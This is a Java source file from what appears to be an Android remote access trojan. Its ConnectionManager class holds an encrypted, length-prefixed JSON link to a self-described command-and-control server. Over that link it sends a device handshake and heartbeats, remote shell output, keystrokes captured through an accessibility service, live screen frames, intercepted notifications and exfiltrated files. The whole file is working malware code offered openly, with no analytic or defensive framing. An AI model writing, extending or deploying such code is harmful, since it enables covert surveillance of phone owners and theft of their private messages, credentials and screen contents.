package com.egnakerat.system;

import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

/**
 * ConnectionManager v2.0
 * Handles encrypted TCP communication with the C2 server.
 * Length-prefixed JSON protocol with AES-256 encryption.
 */
public class ConnectionManager {

    private static final String TAG = "ConnectionManager";

    private Socket socket;
    private DataInputStream input;
    private DataOutputStream output;
    private CryptoHelper crypto;
    private boolean connected = false;
    private String deviceId;

    public ConnectionManager() {
        this.crypto = new CryptoHelper(config.PASSPHRASE);
        this.deviceId = UUID.randomUUID().toString();
    }

    public void setDeviceId(String id) {
        this.deviceId = id;
    }

    public String getDeviceId() {
        return deviceId;
    }

    /**
     * Connect to C2 server with timeout.
     */
    public boolean connect(String ip, int port) {
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), 5000);
            socket.setSoTimeout(0); // No read timeout (we use heartbeats)
            socket.setKeepAlive(true);

            input = new DataInputStream(socket.getInputStream());
            output = new DataOutputStream(socket.getOutputStream());
            connected = true;

            Log.d(TAG, "Connected to " + ip + ":" + port);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Connection failed: " + e.getMessage());
            connected = false;
            return false;
        }
    }

    /**
     * Perform handshake with C2 server.
     */
    public boolean handshake(String model, String androidVersion, String manufacturer) {
        try {
            JSONObject handshake = new JSONObject();
            handshake.put("type", "handshake");
            handshake.put("device_id", deviceId);
            handshake.put("model", model);
            handshake.put("android_version", androidVersion);
            handshake.put("manufacturer", manufacturer);
            handshake.put("key_hash", crypto.getKeyHash());

            sendMessage(handshake);

            // Wait for ACK
            JSONObject ack = receiveMessage();
            if (ack != null && "ok".equals(ack.optString("status"))) {
                Log.d(TAG, "Handshake successful");
                return true;
            }

            Log.e(TAG, "Handshake rejected");
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Handshake failed: " + e.getMessage());
            return false;
        }
    }

    /**
     * Send an encrypted JSON message with length prefix.
     */
    public synchronized void sendMessage(JSONObject message) throws IOException {
        if (!connected || output == null) return;

        String jsonStr = message.toString();
        String encrypted = crypto.encrypt(jsonStr);
        byte[] payload = encrypted.getBytes(StandardCharsets.UTF_8);

        // Write 4-byte big-endian length + payload
        output.writeInt(payload.length);
        output.write(payload);
        output.flush();
    }

    /**
     * Receive and decrypt a JSON message.
     */
    public JSONObject receiveMessage() throws IOException {
        if (!connected || input == null) return null;

        try {
            // Read 4-byte length
            int length = input.readInt();
            if (length <= 0 || length > 50_000_000) {
                Log.e(TAG, "Invalid message length: " + length);
                return null;
            }

            // Read payload
            byte[] payload = new byte[length];
            input.readFully(payload);

            String payloadStr = new String(payload, StandardCharsets.UTF_8);
            String decrypted = crypto.decrypt(payloadStr);

            return new JSONObject(decrypted);
        } catch (JSONException e) {
            Log.e(TAG, "JSON parse error: " + e.getMessage());
            return null;
        }
    }

    /**
     * Send a response message.
     */
    public void sendResponse(String cmdId, String status, JSONObject data) {
        try {
            JSONObject response = new JSONObject();
            response.put("type", "response");
            response.put("id", cmdId);
            response.put("status", status);
            response.put("data", data != null ? data : new JSONObject());
            response.put("device_id", deviceId);
            sendMessage(response);
        } catch (Exception e) {
            Log.e(TAG, "Send response failed: " + e.getMessage());
        }
    }

    /**
     * Send a heartbeat with device info.
     */
    public void sendHeartbeat(JSONObject info) {
        try {
            JSONObject heartbeat = new JSONObject();
            heartbeat.put("type", "heartbeat");
            heartbeat.put("device_id", deviceId);
            heartbeat.put("info", info);
            sendMessage(heartbeat);
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat failed: " + e.getMessage());
        }
    }

    /**
     * Send a stream message (for files, images, etc).
     */
    public void sendStream(String cmdId, String filename, String dataBase64) {
        try {
            JSONObject stream = new JSONObject();
            stream.put("type", "stream");
            stream.put("id", cmdId);
            stream.put("filename", filename);
            stream.put("data", dataBase64);
            stream.put("device_id", deviceId);
            sendMessage(stream);
        } catch (Exception e) {
            Log.e(TAG, "Stream send failed: " + e.getMessage());
        }
    }

    /**
     * Send shell output.
     */
    public void sendShellOutput(String output_text) {
        try {
            JSONObject shell = new JSONObject();
            shell.put("type", "shell_io");
            JSONObject data = new JSONObject();
            data.put("output", output_text);
            shell.put("data", data);
            shell.put("device_id", deviceId);
            sendMessage(shell);
        } catch (Exception e) {
            Log.e(TAG, "Shell output send failed: " + e.getMessage());
        }
    }

    /**
     * Send keylog data from accessibility service.
     */
    public void sendKeylogData(String appName, String text) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "keylog");
            JSONObject data = new JSONObject();
            data.put("app", appName);
            data.put("text", text);
            data.put("timestamp", System.currentTimeMillis());
            msg.put("data", data);
            msg.put("device_id", deviceId);
            sendMessage(msg);
        } catch (Exception e) {
            Log.e(TAG, "Keylog send failed: " + e.getMessage());
        }
    }

    /**
     * Send a screen frame for live streaming.
     */
    public void sendScreenFrame(String frameBase64) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "screen_frame");
            msg.put("data", frameBase64);
            msg.put("device_id", deviceId);
            msg.put("timestamp", System.currentTimeMillis());
            sendMessage(msg);
        } catch (Exception e) {
            Log.e(TAG, "Screen frame send failed: " + e.getMessage());
        }
    }

    /**
     * Send intercepted notification data.
     */
    public void sendNotification(String packageName, String title, String content) {
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "notification_data");
            JSONObject data = new JSONObject();
            data.put("package", packageName);
            data.put("title", title);
            data.put("content", content);
            data.put("timestamp", System.currentTimeMillis());
            msg.put("data", data);
            msg.put("device_id", deviceId);
            sendMessage(msg);
        } catch (Exception e) {
            Log.e(TAG, "Notification send failed: " + e.getMessage());
        }
    }

    public boolean isConnected() {
        return connected && socket != null && socket.isConnected() && !socket.isClosed();
    }

    public void disconnect() {
        connected = false;
        try {
            JSONObject disc = new JSONObject();
            disc.put("type", "disconnect");
            disc.put("device_id", deviceId);
            sendMessage(disc);
        } catch (Exception ignored) {}

        try { if (input != null) input.close(); } catch (Exception ignored) {}
        try { if (output != null) output.close(); } catch (Exception ignored) {}
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
    }
}
